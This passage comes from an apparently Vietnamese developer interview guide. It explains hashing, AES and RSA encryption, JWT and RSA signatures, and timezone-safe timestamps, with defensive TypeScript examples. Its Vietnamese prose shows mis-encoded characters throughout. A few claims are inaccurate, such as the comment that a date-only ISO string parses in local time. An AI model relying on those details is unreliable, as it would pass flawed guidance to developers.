  - `10` = salt rounds (cost factor)
  - `salt` = random salt (22 chars)
  - `hash` = actual hash (31 chars)
- **Salt**: Random value thÃªm vÃ o password trÆ°á»›c khi hash
  - Má»¥c Ä‘Ã­ch: NgÄƒn rainbow table attacks
  - Má»—i user cÃ³ salt khÃ¡c nhau â†’ cÃ¹ng password cÅ©ng khÃ¡c hash
- **bcrypt.compare()**: Tá»± Ä‘á»™ng extract salt tá»« hash vÃ  compare

---

**ğŸ” 1.2. Data Integrity vá»›i SHA-256**

```typescript
import crypto from 'crypto';

// =====================================
// SHA-256 FOR DATA INTEGRITY
// =====================================

// ğŸ”¹ FILE CHECKSUM - Verify file khÃ´ng bá»‹ thay Ä‘á»•i
function generateFileChecksum(fileContent: Buffer): string {
  return crypto
    .createHash('sha256')
    .update(fileContent)
    .digest('hex'); // 64 hex chars (256 bits)
}

// Example: Download file verification
async function downloadAndVerify(url: string, expectedChecksum: string) {
  const fileContent = await downloadFile(url);
  const actualChecksum = generateFileChecksum(fileContent);
  
  if (actualChecksum !== expectedChecksum) {
    throw new Error('File corrupted! Checksum mismatch');
  }
  
  console.log('âœ… File verified successfully');
  return fileContent;
}

// ğŸ”¹ GENERATE UNIQUE TOKEN - Session ID, API keys
function generateSessionToken(userId: string): string {
  const timestamp = Date.now().toString();
  const random = crypto.randomBytes(16).toString('hex');
  
  // Hash combination Ä‘á»ƒ táº¡o unique token
  return crypto
    .createHash('sha256')
    .update(`${userId}:${timestamp}:${random}`)
    .digest('hex');
}

// ğŸ”¹ HMAC - Hash with secret key (for API signatures)
function generateHMAC(data: string, secretKey: string): string {
  return crypto
    .createHmac('sha256', secretKey)
    .update(data)
    .digest('hex');
}

// Example: Verify webhook payload tá»« third-party service
function verifyWebhook(payload: string, signature: string, secret: string): boolean {
  const expectedSignature = generateHMAC(payload, secret);
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expectedSignature)
  );
}
```

**ğŸ’¡ Giáº£i ThÃ­ch:**
- **SHA-256**: Cryptographic hash function (256-bit output)
  - KhÃ´ng dÃ¹ng cho password (quÃ¡ nhanh â†’ vulnerable to brute-force)
  - DÃ¹ng cho checksums, data integrity
- **HMAC** (Hash-based Message Authentication Code):
  - SHA-256 + secret key
  - Verify cáº£ integrity VÃ€ authenticity
  - DÃ¹ng trong webhook signatures, API authentication

---

#### **2ï¸âƒ£ ENCRYPTION - Two-Way Function (MÃ£ HÃ³a Hai Chiá»u)**

> **ï¿½ Xem láº¡i pháº§n [ğŸ” B. ENCRYPTION](#-b-encryption---mÃ£-hÃ³a-hai-chiá»u) á»Ÿ trÃªn Ä‘á»ƒ hiá»ƒu rÃµ cÆ¡ cháº¿ hoáº¡t Ä‘á»™ng cá»§a Symmetric (1 key) vs Asymmetric (2 keys), Public/Private Key, vÃ  Key Distribution Problem!**

**ï¿½ğŸ”‘ Äáº·c Äiá»ƒm:**
- **Two-way**: Plaintext â‡„ Ciphertext (encrypt â†” decrypt)
- **Requires key**: Symmetric (1 key) hoáº·c Asymmetric (2 keys)
- **Protects confidentiality**: Giáº¥u dá»¯ liá»‡u khá»i unauthorized access

**ğŸ“Œ Use Cases:**
1. **HTTPS/TLS**: Encrypt network traffic
2. **Database Encryption**: Protect sensitive PII (emails, phone numbers)
3. **File Encryption**: Encrypt files trÆ°á»›c khi upload cloud
4. **API Keys**: Encrypt secrets trong config

**ğŸ” Nháº¯c Láº¡i CÆ¡ Cháº¿:**

```typescript
// SYMMETRIC (AES): 1 key cho cáº£ encrypt & decrypt
const key = "shared-secret-key";
const encrypted = AES.encrypt("data", key);      // Encrypt vá»›i key
const decrypted = AES.decrypt(encrypted, key);   // Decrypt vá»›i CÃ™NG key
// âš ï¸ Váº¥n Ä‘á»: LÃ m sao gá»­i key an toÃ n?

// ASYMMETRIC (RSA): 2 keys (public + private)
const { publicKey, privateKey } = generateKeys();
const encrypted = RSA.encrypt("data", publicKey);      // Encrypt vá»›i PUBLIC key
const decrypted = RSA.decrypt(encrypted, privateKey);  // Decrypt vá»›i PRIVATE key
// âœ… Giáº£i phÃ¡p: Public key share thoáº£i mÃ¡i, chá»‰ private key giá»¯ bÃ­ máº­t!
```

---

**ğŸ” 2.1. Symmetric Encryption - AES (Advanced Encryption Standard)**

```typescript
import crypto from 'crypto';

// =====================================
// SYMMETRIC ENCRYPTION WITH AES-256-GCM
// =====================================

interface EncryptedData {
  iv: string;           // Initialization Vector (12 bytes for GCM)
  encryptedText: string; // Ciphertext
  authTag: string;      // Authentication Tag (16 bytes)
}

// ğŸ”¹ ENCRYPT - MÃ£ hÃ³a dá»¯ liá»‡u vá»›i AES-256-GCM
function encryptAES(plaintext: string, secretKey: string): EncryptedData {
  // Generate random IV (Initialization Vector)
  // âš ï¸ PHáº¢I random má»—i láº§n encrypt, KHÃ”NG reuse!
  const iv = crypto.randomBytes(12);
  
  // Create cipher vá»›i AES-256-GCM mode
  // GCM = Galois/Counter Mode (authenticated encryption)
  const cipher = crypto.createCipheriv(
    'aes-256-gcm',
    Buffer.from(secretKey, 'hex'), // 32 bytes (256 bits)
    iv
  );
  
  // Encrypt plaintext
  let encryptedText = cipher.update(plaintext, 'utf8', 'hex');
  encryptedText += cipher.final('hex');
  
  // Get authentication tag (verify integrity khi decrypt)
  const authTag = cipher.getAuthTag();
  
  return {
    iv: iv.toString('hex'),
    encryptedText,
    authTag: authTag.toString('hex'),
  };
}

// ğŸ”¹ DECRYPT - Giáº£i mÃ£ dá»¯ liá»‡u
function decryptAES(encrypted: EncryptedData, secretKey: string): string {
  // Create decipher
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    Buffer.from(secretKey, 'hex'),
    Buffer.from(encrypted.iv, 'hex')
  );
  
  // Set authentication tag (verify khÃ´ng bá»‹ tamper)
  decipher.setAuthTag(Buffer.from(encrypted.authTag, 'hex'));
  
  // Decrypt ciphertext
  let plaintext = decipher.update(encrypted.encryptedText, 'hex', 'utf8');
  plaintext += decipher.final('utf8');
  
  return plaintext;
}

// ğŸ”¹ EXAMPLE - Encrypt PII trong database
interface User {
  id: string;
  email: string;         // Plaintext (for login)
  phone: string;         // Encrypted (sensitive PII)
  ssn: string;           // Encrypted (very sensitive)
}

async function saveUser(user: User, encryptionKey: string) {
  const encryptedPhone = encryptAES(user.phone, encryptionKey);
  const encryptedSSN = encryptAES(user.ssn, encryptionKey);
  
  await db.users.create({
    id: user.id,
    email: user.email, // KhÃ´ng encrypt (cáº§n query by email)
    phone: JSON.stringify(encryptedPhone),
    ssn: JSON.stringify(encryptedSSN),
  });
}

async function getUser(userId: string, encryptionKey: string): Promise<User> {
  const dbUser = await db.users.findById(userId);
  
  const encryptedPhone = JSON.parse(dbUser.phone);
  const encryptedSSN = JSON.parse(dbUser.ssn);
  
  return {
    id: dbUser.id,
    email: dbUser.email,
    phone: decryptAES(encryptedPhone, encryptionKey),
    ssn: decryptAES(encryptedSSN, encryptionKey),
  };
}
```

**ğŸ’¡ Giáº£i ThÃ­ch:**
- **AES-256-GCM**:
  - AES = Advanced Encryption Standard (industry standard)
  - 256 = key length (256 bits = 32 bytes)
  - GCM = Galois/Counter Mode (authenticated encryption)
    - Vá»«a encrypt Vá»ªA authenticate (detect tampering)
- **IV (Initialization Vector)**:
  - Random 12 bytes cho GCM mode
  - PHáº¢I unique má»—i láº§n encrypt
  - KhÃ´ng cáº§n secret (lÆ°u cÃ¹ng ciphertext)
- **Auth Tag**:
  - 16 bytes tag verify integrity
  - Náº¿u data bá»‹ modify â†’ decrypt throw error

---

**ğŸ” 2.2. Asymmetric Encryption - RSA (Public/Private Key)**

```typescript
import crypto from 'crypto';

// =====================================
// ASYMMETRIC ENCRYPTION WITH RSA
// =====================================

// ğŸ”¹ GENERATE KEY PAIR - Táº¡o public/private keys
function generateRSAKeyPair(): { publicKey: string; privateKey: string } {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048, // 2048 bits (secure for most use cases)
    publicKeyEncoding: {
      type: 'spki',
      format: 'pem',
    },
    privateKeyEncoding: {
      type: 'pkcs8',
      format: 'pem',
    },
  });
  
  return { publicKey, privateKey };
}

// ğŸ”¹ ENCRYPT vá»›i PUBLIC KEY - Anyone cÃ³ public key cÃ³ thá»ƒ encrypt
function encryptRSA(plaintext: string, publicKey: string): string {
  const buffer = Buffer.from(plaintext, 'utf8');
  
  const encrypted = crypto.publicEncrypt(
    {
      key: publicKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256',
    },
    buffer
  );
  
  return encrypted.toString('base64');
}

// ğŸ”¹ DECRYPT vá»›i PRIVATE KEY - Chá»‰ owner cá»§a private key má»›i decrypt Ä‘Æ°á»£c
function decryptRSA(ciphertext: string, privateKey: string): string {
  const buffer = Buffer.from(ciphertext, 'base64');
  
  const decrypted = crypto.privateDecrypt(
    {
      key: privateKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256',
    },
    buffer
  );
  
  return decrypted.toString('utf8');
}

// ğŸ”¹ EXAMPLE - Secure message exchange
const alice = generateRSAKeyPair();
const bob = generateRSAKeyPair();

// Alice gá»­i message cho Bob
const message = 'Secret meeting at 3pm';
const encryptedMessage = encryptRSA(message, bob.publicKey); // DÃ¹ng Bob's public key
console.log('Encrypted:', encryptedMessage);

// Bob decrypt message
const decryptedMessage = decryptRSA(encryptedMessage, bob.privateKey); // DÃ¹ng Bob's private key
console.log('Decrypted:', decryptedMessage); // "Secret meeting at 3pm"

// âš ï¸ Alice KHÃ”NG thá»ƒ decrypt (khÃ´ng cÃ³ Bob's private key)
```

**ğŸ’¡ Giáº£i ThÃ­ch:**
- **RSA Asymmetric**:
  - Public key: Share freely, dÃ¹ng Ä‘á»ƒ ENCRYPT
  - Private key: Keep secret, dÃ¹ng Ä‘á»ƒ DECRYPT
  - Math: Easy encrypt, hard decrypt without private key (based on factorization)
- **Use Cases**:
  - HTTPS/TLS handshake (exchange symmetric keys)
  - PGP email encryption
  - SSH authentication
- **Limitations**:
  - Slow (10-100x slower than AES)
  - Size limit (RSA-2048 max ~245 bytes plaintext)
  - â†’ ThÆ°á»ng dÃ¹ng Ä‘á»ƒ encrypt symmetric key, rá»“i dÃ¹ng AES cho data

---

#### **3ï¸âƒ£ DIGITAL SIGNATURES - Sign & Verify (Chá»¯ KÃ½ Sá»‘)**

> **ğŸ’¡ Xem láº¡i pháº§n [ğŸ” C. DIGITAL SIGNATURE](#-c-digital-signature---chá»¯-kÃ½-sá»‘) á»Ÿ trÃªn Ä‘á»ƒ hiá»ƒu rÃµ cÆ¡ cháº¿: Sign vá»›i Private Key (chá»‰ signer cÃ³), Verify vá»›i Public Key (ai cÅ©ng verify Ä‘Æ°á»£c), vÃ  táº¡i sao dÃ¹ng cho JWT RS256!**

**ğŸ”‘ Äáº·c Äiá»ƒm:**
- **Sign vá»›i private key**: Chá»‰ owner cÃ³ thá»ƒ sign
- **Verify vá»›i public key**: Anyone cÃ³ thá»ƒ verify
- **Proves authenticity**: Message tá»« Ä‘Ãºng ngÆ°á»i (chá»‰ há» cÃ³ private key)
- **Proves integrity**: Message khÃ´ng bá»‹ thay Ä‘á»•i (hash khá»›p)

**ğŸ“Œ Use Cases:**
1. **JWT Tokens**: Sign payload vá»›i RS256
2. **API Authentication**: Verify requests tá»« trusted clients
3. **Code Signing**: Verify software khÃ´ng bá»‹ tamper
4. **Blockchain**: Sign transactions

**ğŸ” Nháº¯c Láº¡i CÆ¡ Cháº¿:**

```typescript
// DIGITAL SIGNATURE: Äáº£o ngÆ°á»£c Encryption!

// ENCRYPTION (Báº£o máº­t):
Encrypt vá»›i: RECEIVER's PUBLIC KEY    â†’ Decrypt vá»›i: RECEIVER's PRIVATE KEY
Má»¥c Ä‘Ã­ch: Giáº¥u message, chá»‰ receiver Ä‘á»c Ä‘Æ°á»£c

// SIGNATURE (XÃ¡c thá»±c):
Sign vá»›i: SIGNER's PRIVATE KEY        â†’ Verify vá»›i: SIGNER's PUBLIC KEY
Má»¥c Ä‘Ã­ch: Chá»©ng minh message tá»« signer, ai cÅ©ng verify Ä‘Æ°á»£c

// VÃ Dá»¤:
const { publicKey, privateKey } = generateKeys();

// Sign document
const hash = SHA256(document);
const signature = RSA.encrypt(hash, privateKey);  // Sign = Encrypt hash vá»›i PRIVATE key

// Verify signature
const hash1 = SHA256(document);
const hash2 = RSA.decrypt(signature, publicKey);  // Verify = Decrypt vá»›i PUBLIC key
if (hash1 === hash2) console.log("âœ… Valid signature!");
```

---

**ğŸ” 3.1. JWT Digital Signature vá»›i RS256**

```typescript
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

// =====================================
// JWT DIGITAL SIGNATURE WITH RS256
// =====================================

// ğŸ”¹ GENERATE RSA KEYS for JWT
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

// ğŸ”¹ SIGN JWT - Server táº¡o token khi user login
function signJWT(payload: object): string {
  // Sign vá»›i PRIVATE KEY
  const token = jwt.sign(
    payload,
    privateKey,
    {
      algorithm: 'RS256',    // RSA with SHA-256
      expiresIn: '1h',       // Token expires trong 1 giá»
      issuer: 'my-app',      // App name
    }
  );
  
  return token;
}

// ğŸ”¹ VERIFY JWT - Server verify token tá»« client
function verifyJWT(token: string): object {
  try {
    // Verify vá»›i PUBLIC KEY
    const payload = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],
      issuer: 'my-app',
    });
    
    return payload as object;
  } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
      throw new Error('Token expired');
    }
    if (error instanceof jwt.JsonWebTokenError) {
      throw new Error('Invalid token');
    }
    throw error;
  }
}

// ğŸ”¹ EXAMPLE - Authentication flow
interface JWTPayload {
  userId: string;
  email: string;
  role: string;
}

// Login â†’ Generate JWT
async function login(email: string, password: string): Promise<string> {
  const user = await authenticateUser(email, password);
  
  const payload: JWTPayload = {
    userId: user.id,
    email: user.email,
    role: user.role,
  };
  
  const token = signJWT(payload);
  console.log('Generated JWT:', token);
  // eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOi...
  
  return token;
}

// Protected route â†’ Verify JWT
async function getProfile(token: string): Promise<JWTPayload> {
  const payload = verifyJWT(token) as JWTPayload;
  
  console.log('Verified user:', payload.userId);
  return payload;
}

// ğŸ”¹ JWT STRUCTURE
// JWT cÃ³ 3 pháº§n (separated by dot):
// HEADER.PAYLOAD.SIGNATURE

// 1. HEADER (algorithm + type)
const header = {
  alg: 'RS256',
  typ: 'JWT',
};

// 2. PAYLOAD (claims)
const payload = {
  userId: '123',
  email: 'user@example.com',
  role: 'admin',
  iat: 1234567890,  // Issued at
  exp: 1234571490,  // Expires at
};

// 3. SIGNATURE (sign header + payload vá»›i private key)
// signature = RSA-SHA256(
//   base64(header) + '.' + base64(payload),
//   privateKey
// )

// âœ… Verify process:
// 1. Decode header + payload tá»« JWT
// 2. Compute signature vá»›i public key
// 3. Compare vá»›i signature trong JWT
// 4. Náº¿u match â†’ valid, khÃ´ng match â†’ tampered
```

**ğŸ’¡ Giáº£i ThÃ­ch:**
- **RS256** (RSA + SHA-256):
  - Sign vá»›i private key â†’ chá»‰ server má»›i sign Ä‘Æ°á»£c
  - Verify vá»›i public key â†’ client/services verify Ä‘Æ°á»£c
  - SHA-256: Hash algorithm Ä‘á»ƒ sign
- **JWT Flow**:
  1. Server sign payload vá»›i private key
  2. Client lÆ°u token (localStorage/cookie)
  3. Client gá»­i token trong Authorization header
  4. Server verify token vá»›i public key
  5. Náº¿u valid â†’ allow access
- **Security**:
  - Private key PHáº¢I keep secret (trÃªn server)
  - Public key cÃ³ thá»ƒ share (cho clients verify)
  - Náº¿u private key leak â†’ attacker cÃ³ thá»ƒ forge tokens!

---

**ğŸ” 3.2. Manual RSA Signature (Low-Level)**

```typescript
import crypto from 'crypto';

// =====================================
// MANUAL RSA DIGITAL SIGNATURE
// =====================================

// ğŸ”¹ SIGN DATA - Táº¡o chá»¯ kÃ½ sá»‘
function signData(data: string, privateKey: string): string {
  const sign = crypto.createSign('SHA256');
  sign.update(data);
  sign.end();
  
  const signature = sign.sign(privateKey, 'base64');
  return signature;
}

// ğŸ”¹ VERIFY SIGNATURE - XÃ¡c thá»±c chá»¯ kÃ½
function verifySignature(data: string, signature: string, publicKey: string): boolean {
  const verify = crypto.createVerify('SHA256');
  verify.update(data);
  verify.end();
  
  return verify.verify(publicKey, signature, 'base64');
}

// ğŸ”¹ EXAMPLE - API Request Signature
interface APIRequest {
  method: string;
  path: string;
  body: object;
  timestamp: number;
}

// Client signs request
function signAPIRequest(request: APIRequest, privateKey: string): string {
  // Serialize request to string
  const requestString = JSON.stringify({
    method: request.method,
    path: request.path,
    body: request.body,
    timestamp: request.timestamp,
  });
  
  // Sign request
  return signData(requestString, privateKey);
}

// Server verifies request
function verifyAPIRequest(request: APIRequest, signature: string, publicKey: string): boolean {
  const requestString = JSON.stringify({
    method: request.method,
    path: request.path,
    body: request.body,
    timestamp: request.timestamp,
  });
  
  // Verify signature
  const isValid = verifySignature(requestString, signature, publicKey);
  
  if (!isValid) {
    console.log('âŒ Invalid signature - request tampered or wrong key');
    return false;
  }
  
  // Check timestamp (prevent replay attacks)
  const now = Date.now();
  const age = now - request.timestamp;
  
  if (age > 5 * 60 * 1000) { // 5 minutes
    console.log('âŒ Request too old - possible replay attack');
    return false;
  }
  
  console.log('âœ… Signature valid');
  return true;
}

// Example usage
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

const request: APIRequest = {
  method: 'POST',
  path: '/api/users',
  body: { name: 'John' },
  timestamp: Date.now(),
};

// Client signs
const signature = signAPIRequest(request, privateKey);
console.log('Signature:', signature);

// Server verifies
const isValid = verifyAPIRequest(request, signature, publicKey);
console.log('Valid?', isValid); // true
```

**ğŸ’¡ Giáº£i ThÃ­ch:**
- **Digital Signature Process**:
  1. Hash data vá»›i SHA-256
  2. Encrypt hash vá»›i private key â†’ signature
  3. Gá»­i data + signature
  4. Receiver hash data
  5. Decrypt signature vá»›i public key
  6. Compare hashes â†’ náº¿u match = valid
- **Security Benefits**:
  - **Authenticity**: Chá»‰ owner cá»§a private key má»›i sign Ä‘Æ°á»£c
  - **Integrity**: Náº¿u data thay Ä‘á»•i â†’ hash khÃ¡c â†’ verify fail
  - **Non-repudiation**: Signer khÃ´ng thá»ƒ deny Ä‘Ã£ sign

---

#### **ğŸ“š Khi NÃ o DÃ¹ng GÃ¬?**

| Scenario                           | Solution                          | Reason                                      |
| ---------------------------------- | --------------------------------- | ------------------------------------------- |
| **Store passwords**                | bcrypt Hashing                    | One-way, slow (prevent brute-force)        |
| **Verify file integrity**          | SHA-256 Checksum                  | Fast, detect corruption/tampering           |
| **Encrypt database PII**           | AES-256-GCM                       | Symmetric, fast, authenticated              |
| **HTTPS/TLS**                      | RSA (key exchange) + AES (data)   | RSA slow â†’ dÃ¹ng cho key, AES cho data       |
| **JWT authentication**             | RS256 Digital Signature           | Public verify, private sign                 |
| **API request authentication**     | HMAC or RSA Signature             | Verify request tá»« trusted client            |
| **Webhook verification**           | HMAC-SHA256                       | Shared secret, fast                         |
| **Email encryption (PGP)**         | RSA + AES                         | RSA cho key exchange, AES cho message       |

---

#### **ğŸ”¥ Best Practices**

**âœ… DO:**
1. **Passwords**: DÃ¹ng bcrypt/argon2, KHÃ”NG dÃ¹ng SHA-256
2. **Sensitive data**: Encrypt vá»›i AES-256-GCM trong database
3. **HTTPS**: Always enable trong production
4. **JWT**: DÃ¹ng RS256 (khÃ´ng dÃ¹ng HS256 vá»›i shared secret)
5. **Key rotation**: Rotate encryption keys Ä‘á»‹nh ká»³
6. **IV/Salt**: Always random, unique má»—i láº§n
7. **Secrets**: Store trong environment variables/secret managers

**âŒ DON'T:**
1. **KHÃ”NG dÃ¹ng MD5/SHA-1**: Deprecated, vulnerable
2. **KHÃ”NG hardcode keys**: Trong source code
3. **KHÃ”NG reuse IV**: Trong AES encryption
4. **KHÃ”NG dÃ¹ng ECB mode**: Trong AES (dÃ¹ng GCM/CBC)
5. **KHÃ”NG share private keys**: Keep secret!
6. **KHÃ”NG dÃ¹ng custom crypto**: DÃ¹ng libraries proven secure

---

#### **ğŸ¯ Common Mistakes & Corrections**

**âŒ Mistake 1: DÃ¹ng SHA-256 cho passwords**
```typescript
// âŒ BAD - SHA-256 too fast, vulnerable to brute-force
const hashedPassword = crypto.createHash('sha256').update(password).digest('hex');
```

**âœ… Correction:**
```typescript
// âœ… GOOD - bcrypt slow, secure
const hashedPassword = await bcrypt.hash(password, 10);
```

---

**âŒ Mistake 2: Reuse IV trong AES**
```typescript
// âŒ BAD - Same IV for multiple encryptions
const iv = Buffer.from('1234567890123456');
const cipher1 = crypto.createCipheriv('aes-256-gcm', key, iv);
const cipher2 = crypto.createCipheriv('aes-256-gcm', key, iv); // âŒ Same IV!
```

**âœ… Correction:**
```typescript
// âœ… GOOD - Random IV má»—i láº§n
const iv1 = crypto.randomBytes(12);
const iv2 = crypto.randomBytes(12); // Different IV
```

---

**âŒ Mistake 3: Hardcode encryption keys**
```typescript
// âŒ BAD - Key in source code
const key = 'my-secret-key-12345678901234567890';
```

**âœ… Correction:**
```typescript
// âœ… GOOD - Key from environment
const key = process.env.ENCRYPTION_KEY;
if (!key || key.length !== 32) {
  throw new Error('Invalid ENCRYPTION_KEY');
}
```

---

**âŒ Mistake 4: KhÃ´ng verify JWT signature**
```typescript
// âŒ BAD - Decode without verify
const payload = JSON.parse(
  Buffer.from(token.split('.')[1], 'base64').toString()
);
```

**âœ… Correction:**
```typescript
// âœ… GOOD - Always verify signature
const payload = jwt.verify(token, publicKey);
```

---

**ğŸ¯ Káº¿t Luáº­n:**

**Hashing:**
- âœ… One-way, dÃ¹ng cho passwords (bcrypt), checksums (SHA-256)
- âœ… KhÃ´ng thá»ƒ decrypt

**Encryption:**
- âœ… Two-way, dÃ¹ng cho sensitive data (AES), key exchange (RSA)
- âœ… Symmetric (AES) nhanh, Asymmetric (RSA) cháº­m nhÆ°ng khÃ´ng cáº§n share key

**Digital Signatures:**
- âœ… Verify authenticity & integrity
- âœ… JWT (RS256), API authentication, webhooks

**ğŸ’¡ Key Takeaway:**
- Hash cho verification, Encryption cho confidentiality, Signature cho authenticity
- DÃ¹ng proven libraries (bcrypt, crypto, jsonwebtoken)
- Never roll your own crypto!

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">â° Q53: Date & Time Handling - Xá»­ LÃ½ MÃºi Giá» ÄÃºng CÃ¡ch</span></summary>


**â“ CÃ¢u Há»i:**
LÃ m tháº¿ nÃ o xá»­ lÃ½ Date/Time trong JavaScript khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng bá»Ÿi mÃºi giá»?


#### **âš ï¸ Váº¥n Äá» Core**

```typescript
// âŒ Váº¤N Äá»€: Timezone-dependent
const date = new Date('2024-01-15'); // Local timezone!
// User Vietnam (UTC+7): 2024-01-15 07:00:00 UTC
// User US (UTC-5):      2024-01-15 05:00:00 UTC
// â†’ CÃ¹ng code, khÃ¡c káº¿t quáº£!

// âŒ Váº¤N Äá»€: Month zero-indexed
new Date(2024, 1, 15); // February 15! (month 1 = Feb)

// âŒ Váº¤N Äá»€: Mutable
date.setMonth(2); // Thay Ä‘á»•i date gá»‘c!
```

---

#### **ğŸ’¡ Timestamp - Táº¡i Sao KhÃ´ng Bá»‹ áº¢nh HÆ°á»Ÿng Timezone?**

**Timestamp = Sá»‘ milliseconds tá»« 1970-01-01 00:00:00 UTC (Unix Epoch)**

```typescript
// =====================================
// TIMESTAMP LÃ€ Má»˜T CON Sá» TUYá»†T Äá»I
// =====================================

// VÃ­ dá»¥: 2024-01-15 14:30:00 UTC
const timestamp = 1705329000000; // milliseconds

// âœ… Timestamp Ä‘áº¡i diá»‡n cho 1 ÄIá»‚M THá»œI GIAN DUY NHáº¤T trÃªn toÃ n cáº§u
// - KhÃ´ng phá»¥ thuá»™c mÃºi giá»
// - KhÃ´ng phá»¥ thuá»™c vá»‹ trÃ­ Ä‘á»‹a lÃ½
// - Chá»‰ lÃ  1 con sá»‘: sá»‘ milli-giÃ¢y tá»« 1970-01-01 00:00:00 UTC

// GIáº¢I THÃCH:
// â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
// â”‚  Timestamp 1705329000000 = "2024-01-15 14:30:00 UTC"   â”‚
// â”‚                                                         â”‚
// â”‚  CÃ¹ng 1 timestamp, DISPLAY khÃ¡c mÃºi giá»:               â”‚
// â”‚  - Vietnam (UTC+7):  2024-01-15 21:30:00               â”‚
// â”‚  - New York (UTC-5): 2024-01-15 09:30:00               â”‚
// â”‚  - London (UTC+0):   2024-01-15 14:30:00               â”‚
// â”‚                                                         â”‚
// â”‚  NhÆ°ng timestamp VáºªN LÃ€ 1705329000000                  â”‚
// â”‚  â†’ CÃ¹ng 1 Ä‘iá»ƒm thá»i gian, chá»‰ HIá»‚N THá»Š khÃ¡c!           â”‚
// â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**So SÃ¡nh Trá»±c Quan:**

```typescript
// =====================================
// VÃ Dá»¤ THá»°C Táº¾
// =====================================

// Server gá»­i timestamp
const serverTimestamp = 1705329000000; // 2024-01-15 14:30:00 UTC

// User á»Ÿ Vietnam nháº­n Ä‘Æ°á»£c
const vnDate = new Date(serverTimestamp);
console.log(vnDate.toString());
// "Mon Jan 15 2024 21:30:00 GMT+0700 (Indochina Time)"
// âœ… Display: 21:30:00 (UTC+7)
// âœ… Timestamp: 1705329000000

// User á»Ÿ US nháº­n Ä‘Æ°á»£c
const usDate = new Date(serverTimestamp);
console.log(usDate.toString());
// "Mon Jan 15 2024 09:30:00 GMT-0500 (Eastern Standard Time)"
// âœ… Display: 09:30:00 (UTC-5)
// âœ… Timestamp: 1705329000000

// So sÃ¡nh timestamps
console.log(vnDate.getTime() === usDate.getTime()); // âœ… TRUE!
console.log(vnDate.getTime()); // 1705329000000
console.log(usDate.getTime()); // 1705329000000

// =====================================
// Táº I SAO TIMESTAMP KHÃ”NG Bá»Š áº¢NH HÆ¯á»NG?
// =====================================

// 1. Timestamp lÃ  CON Sá», khÃ´ng pháº£i string hay object
const ts = 1705329000000; // Chá»‰ lÃ  1 sá»‘ nguyÃªn

// 2. Timestamp luÃ´n tÃ­nh tá»« UTC EPOCH (1970-01-01 00:00:00 UTC)
// â†’ Chuáº©n quá»‘c táº¿, khÃ´ng Ä‘á»•i

// 3. Khi convert timestamp â†’ Date, browser tá»± Ä‘á»™ng hiá»ƒn thá»‹ theo local timezone
// NhÆ°ng INTERNAL VALUE váº«n lÃ  timestamp (khÃ´ng Ä‘á»•i)
const date = new Date(1705329000000);
date.getTime(); // 1705329000000 (giá»‘ng nhau má»i nÆ¡i)
date.toString(); // KhÃ¡c nhau theo timezone (chá»‰ lÃ  display)

// =====================================
// MINH Há»ŒA Báº° NG Sá»
// =====================================

// Giáº£ sá»­ cÃ³ 3 user á»Ÿ 3 mÃºi giá» khÃ¡c nhau cÃ¹ng click "Submit" 1 lÃºc

// User Vietnam (UTC+7) - Hiá»ƒn thá»‹: 2024-01-15 21:30:00
const vnTimestamp = new Date('2024-01-15T21:30:00+07:00').getTime();
console.log(vnTimestamp); // 1705329000000

// User US (UTC-5) - Hiá»ƒn thá»‹: 2024-01-15 09:30:00
const usTimestamp = new Date('2024-01-15T09:30:00-05:00').getTime();
console.log(usTimestamp); // 1705329000000

// User UK (UTC+0) - Hiá»ƒn thá»‹: 2024-01-15 14:30:00
const ukTimestamp = new Date('2024-01-15T14:30:00Z').getTime();
console.log(ukTimestamp); // 1705329000000

// âœ… CÃ™NG 1 TIMESTAMP = CÃ™NG 1 THá»œI ÄIá»‚M
// â†’ LÆ°u vÃ o database: 1705329000000
// â†’ Compare: So sÃ¡nh 1 sá»‘ duy nháº¥t
// â†’ KhÃ´ng bá»‹ sai lá»‡ch mÃºi giá»
```

**Káº¿t Luáº­n:**

```typescript
// =====================================
// TIMESTAMP = UNIVERSAL TIME REFERENCE
// =====================================

// âœ… Timestamp lÃ  "ngÃ´n ngá»¯ chung" cá»§a thá»i gian
// - Má»i timezone Ä‘á»u convert vá» 1 sá»‘ duy nháº¥t
// - Database lÆ°u 1 giÃ¡ trá»‹, khÃ´ng phá»¥ thuá»™c mÃºi giá»
// - API truyá»n 1 sá»‘, khÃ´ng bá»‹ nháº§m láº«n
// - So sÃ¡nh Ä‘Æ¡n giáº£n: a > b, a === b

// âŒ String date Bá»Š áº¢NH HÆ¯á»NG timezone
'2024-01-15' // Ambiguous! 00:00 mÃºi giá» nÃ o?
'2024-01-15 14:30' // MÃºi giá» nÃ o?

// âœ… Timestamp KHÃ”NG Bá»Š áº¢NH HÆ¯á»NG
1705329000000 // LUÃ”N LÃ€ 2024-01-15 14:30:00 UTC
